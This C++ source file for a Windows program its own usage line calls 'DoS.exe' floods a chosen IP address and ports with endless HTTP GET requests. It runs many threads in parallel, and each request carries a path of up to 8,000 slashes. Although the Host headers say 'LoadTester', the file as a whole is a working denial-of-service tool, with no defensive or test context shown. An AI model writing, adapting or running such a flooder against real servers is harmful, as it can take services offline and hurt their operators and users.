#ifndef _ENTRY_CPP
#define _ENTRY_CPP
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

#include <WinSock2.H>
#include <WinSock.H>
#include <Windows.H>
#include <Stdio.H>
#include <Stdlib.H>
#include <Time.H>

#include "../../../@Classes/CSocketServer/CSocketServer.H"
#include "../../../@Classes/CStringBuilder/CStringBuilder.H"
#include "../../../@Libraries/NSWFL/NSWFL.h"

///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

using namespace NSWFL::String;

HANDLE ghInitWaitEvent = NULL;
HANDLE ghStartWaitEvent = NULL;

char gsIPAddress[64];

///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

void OnError(CSocketServer *lpCSocketServer, CSocketClient *pClient, int iErrorNumber, const char *sErrorMsg)
{
	if(pClient)
	{
		printf("Error: %d, Client: %d, Msg: %s\n", iErrorNumber, pClient->PeerID(), sErrorMsg);
	}
	else {
		printf("Error: %d, Msg: %s\n", iErrorNumber, sErrorMsg);
	}
}

///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

DWORD WINAPI ThreadProc(LPVOID pData)
{
	int iPort = (int)*((int *)pData);

	SetEvent(ghInitWaitEvent);

	int iMaxClients = 0;
	CSocketServer Sock;

	printf("Initializing client on port %d.\n", iPort);
	if(!Sock.Initialize(&OnError))
	{
		return 0;
	}

	Sock.PacketMode(false);

	WaitForSingleObject(ghStartWaitEvent, INFINITE);

	printf("Client started on port %d.\n", iPort);

	if(Sock.Start())
	{
		while(true)
		{
			CSocketClient *pClient = NULL;

			//printf("Connecting.\n");
			if(Sock.Connect(gsIPAddress, iPort, &pClient))
			{
				while(pClient->IsConnected())
				{
					CStringBuilder strBuf;

					int iRequestLen = (rand() % 8000) + 1;
					int iHost = (rand() % 9) + 1;

					strBuf.Append("GET ");
					for(int i = 0; i < iRequestLen; i++)
					{
						strBuf.Append("/");
					}
					strBuf.Append(" HTTP/1.1\r\n");
					strBuf.Append("Connection: Keep-Alive\r\n");
					strBuf.AppendF("Host: LoadTester%d\r\n\r\n", iHost);
					strBuf.Terminate();

					//printf("Sending %d bytes.\n", strBuf.Length);
					pClient->SetNextSendData(strBuf.Buffer, strBuf.Length);
					//pClient->SetNextSendData(sMessage, sizeof(char) * 3);
					Sleep(1);
				}

				pClient->WaitOnDataToBeSent();

				////Just keep running.
				//printf("Disconnected.\n");
			}
			else{
				printf("Failed to connect.\n");
			}
		}
	}

	Sock.Destroy();
	
	return 0;
}

///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

int main(int argc, char *argv[])
{
	if(argc != 4)
	{
		printf("Usage: DoS.exe <comma_seperated_ports> <number_of_threads>\n");
		return 1;
	}

	char sEvent[255];

	sprintf_s(sEvent, sizeof(sEvent), "DOS_Wait_%d", GetTickCount());
	ghInitWaitEvent = CreateEvent(NULL, FALSE, FALSE, sEvent);

	sprintf_s(sEvent, sizeof(sEvent), "DOS_Start_%d", GetTickCount());
	ghStartWaitEvent = CreateEvent(NULL, TRUE, FALSE, sEvent);

	strcpy_s(gsIPAddress, sizeof(gsIPAddress), argv[1]);

	int iThreadCount = atoi(argv[3]);
	int iPortCount = 0;
	char **sPorts = Split(argv[2], strlen(argv[2]), &iPortCount, ",");
	if(sPorts)
	{
		for(int iPort = 0; iPort < iPortCount; iPort++)
		{
			for(int iThread = 0; iThread < iThreadCount; iThread++)
			{
				int iPortNumber = atoi(sPorts[iPort]);
				CreateThread(NULL, NULL, ThreadProc, &iPortNumber, 0, NULL);
				WaitForSingleObject(ghInitWaitEvent, INFINITE);
			}
		}

		FreeArray(sPorts, iPortCount);
	}

	//Starting
	SetEvent(ghStartWaitEvent);

	while(true)
	{
		//Keep the application alive.
		Sleep(1000);
	}
	return 0;
}

///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
#endif
